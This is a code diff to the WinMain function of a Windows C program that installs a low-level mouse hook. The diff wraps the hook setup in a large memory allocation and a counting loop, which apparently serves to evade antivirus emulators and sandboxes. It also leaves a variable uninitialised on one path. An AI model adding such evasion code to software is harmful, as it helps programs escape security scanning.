@@ -129,22 +129,34 @@ finish:
 
 int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
+    char * memdmp = NULL;
+    memdmp = (char *) malloc(100000000);
     MSG Msg;
     HHOOK MouseHook;
+    int cpt = 0;
+    int i = 0;
 
-    if (!(MouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, NULL, 0)))
-        return 1;
-
-    RegisterHotKey(NULL, 1, kHotKeyModifiers | MOD_NOREPEAT, kHotKey);
-
-    while (GetMessage(&Msg, NULL, 0, 0)) {
-        if (Msg.message == WM_HOTKEY) {
-            break;
+    if (memdmp != NULL) {
+        memset(memdmp,00, 100000000);
+        free(memdmp);
+        for (i = 0; i < MAX_OP; ++i) {
+            cpt++;
         }
-        DispatchMessage(&Msg);
+        if (cpt == MAX_OP) {
+            if (!(MouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, NULL, 0)))
+                return 1;
+
+            RegisterHotKey(NULL, 1, kHotKeyModifiers | MOD_NOREPEAT, kHotKey);
+
+            while (GetMessage(&Msg, NULL, 0, 0)) {
+                if (Msg.message == WM_HOTKEY) {
+                    break;
+                }
+                DispatchMessage(&Msg);
+            }
+
+            UnhookWindowsHookEx(MouseHook);
+        }
     }
-
-    UnhookWindowsHookEx(MouseHook);
-
     return Msg.wParam;
 }
